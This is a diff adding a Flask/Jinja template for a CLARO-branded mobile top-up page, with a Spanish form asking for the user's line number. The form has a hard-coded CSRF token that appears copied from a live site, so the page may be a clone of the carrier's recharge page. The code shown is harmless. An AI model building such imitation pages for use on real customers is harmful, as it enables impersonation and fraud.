@@ -1,0 +1,34 @@
+{% extends "base.html" %}
+
+{% block content %}
+<body id="page-pin" class="page__pin">
+  <div class="login page__info">
+</br>
+</br>
+</br>
+    <div class="login__content">
+      <h1 class="login__logo">
+        <img src="{{ url_for('static', filename='img/icono-home-256.png') }}" width="85" alt="">
+      </h1>
+      <p class="login__description">Ingresá tu número de línea CLARO, para recargar.</p>
+      <form action="{{ url_for('recharge_line') }}" method="post">
+        <div class="loginform">
+          <input minlength="8" maxlength="11" type="hidden" name="_csrf" value="68e21c33-9061-4b51-8209-976695d10310">
+          
+
+    
+          <input type="text" name="number" id="number" minlength="8" maxlength="11" pattern="^([0-9 ]+)+$"  placeholder="EJ: 1123456789" class="loginform__input" required="">
+          <label for="number" class="loginform__label loginform__label__always_focused">Número de línea</label>
+          <span class="loginform__span">Código de área + tu número sin el 15</span>
+          
+          
+          <span class="loginform__error__icon icon icon--info-warning-rounded"></span>
+          <span class="loginform__success__icon icon icon--success-rounded"></span>
+          <span class="loginform__edit__icon icon icon--edit"></span>
+        </div>
+        <button id="pin__submit" class="loginform__button loginform__button--resolve" type="submit">Continuar</button>
+      </form>
+    </div>
+  </div>
+</body>
+{% endblock %}
